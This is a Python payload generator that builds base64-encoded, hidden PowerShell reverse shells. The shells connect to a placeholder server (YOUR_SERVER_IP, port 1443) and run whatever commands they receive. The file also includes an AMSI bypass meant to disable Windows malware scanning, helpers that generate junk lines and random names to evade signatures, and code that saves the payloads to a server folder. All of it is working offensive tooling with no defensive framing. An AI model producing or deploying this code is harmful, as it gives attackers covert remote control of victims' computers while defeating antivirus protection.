import random
import string
import os
import base64
from datetime import datetime

def rand_name(length=None):
    length = length or random.randint(8, 14)
    return ''.join(random.choices(string.ascii_letters, k=length))

def junk_code():
    j = [
        f"${rand_name()} = {random.randint(1,100)}",
        f"# {rand_name()}_{random.randint(1000,9999)}",
        f"$null = {random.randint(0,1)}",
        f"${rand_name()} = '{rand_name(3)}'",
        f"# {rand_name(4)}"
    ]
    return random.choice(j) + "\n"

def amsi_bypass_block(var):
    # Only field name is obfuscated for reliability
    field = '+'.join([f"'{c}'" for c in "amsiInitFailed"])
    return (
        f"${var['amsi_type']} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
        f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField({field},'NonPublic,Static')\n"
        f"${var['amsi_field']}.SetValue($null,$true)\n"
    )
def generate_obfuscated_ps(host="YOUR_SERVER_IP", port=1443, write_file=True):
    core_shell = f"""
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{
    $cmd = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i).Trim();
    try {{
        $result = iex $cmd 2>&1 | Out-String;
    }} catch {{
        $result = $_.Exception.Message;
    }}
    $result += 'PS ' + (pwd).Path + '> ';
    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($result);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
"""
    encoded_shell = base64.b64encode(core_shell.encode('utf-8')).decode()
    final_payload = f"powershell -nop -w hidden -e {encoded_shell}"

    if write_file:
        folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
        os.makedirs(folder, exist_ok=True)
        filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
        path = os.path.join(folder, filename)
        with open(path, 'w') as f:
            f.write(final_payload)
        return filename
    else:
        return final_payload


# Alias for your other code
generate_polymorphic_ps = generate_obfuscated_ps
